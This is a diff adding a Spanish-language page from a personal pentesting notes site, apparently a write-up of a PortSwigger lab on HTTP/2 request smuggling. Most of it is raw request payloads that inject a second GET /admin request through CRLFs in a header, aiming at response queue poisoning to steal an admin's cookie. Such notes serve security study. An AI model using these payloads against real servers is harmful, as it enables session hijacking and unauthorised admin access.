@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Vamos a meter una request dentro de una cabecera metiendo CRLFsEsto lo hacemos con el objetivo de hacer response queue poisoining.&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Vamos a meter una request dentro de una cabecera metiendo CRLFs
+Esto lo hacemos con el objetivo de hacer response queue poisoining.</p>
+
+<p>El problema es que el frontend sobreescribe la petición para añadirle una cabecera Host personalizada, por lo que la primera petición no tendrá cabecera Host y la segunda tendrá 2 :</p>
+
+<pre><code class="language-HTTP">:method	GET
+:path	/
+:authority	vulnerable-website.com
+:foo	bar{\r\n}
+{\r\n}
+GET /admin HTTP/1.1{\r\n}
+Host: vulnerable-website.com
+</code></pre>
+
+<p>Así cada petición tendrá cabecera host :</p>
+
+<pre><code class="language-HTTP">:method	GET
+:path	/
+:authority	vulnerable-website.com
+:foo	bar{\r\n}
+Host: vulnerable-website.com{\r\n}
+{\r\n}
+GET /admin HTTP/1.1
+</code></pre>
+
+<p>Esto puede funcionar :</p>
+
+<pre><code class="language-HTTP">GET /404 HTTP/2
+Host: 0aa2006804d362d78012e4e500d200a4.web-security-academy.net
+Foo: bar{\r\n}Host: 0aa2006804d362d78012e4e500d200a4.web-security-academy.net{\r\n}{\r\n}GET /404 HTTP/1.1
+</code></pre>
+
+<p>La cosa es que es el admin el que está navegando por la web, queremos que el admin entre al panel de /admin para que nos tire un 302 con la cookie, no que haga un 404 :</p>
+
+<pre><code class="language-HTTP">GET /404 HTTP/2
+Host: 0aa2006804d362d78012e4e500d200a4.web-security-academy.net
+Foo: bar{\r\n}Host: 0aa2006804d362d78012e4e500d200a4.web-security-academy.net{\r\n}{\r\n}GET /admin HTTP/1.1
+</code></pre>
+
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
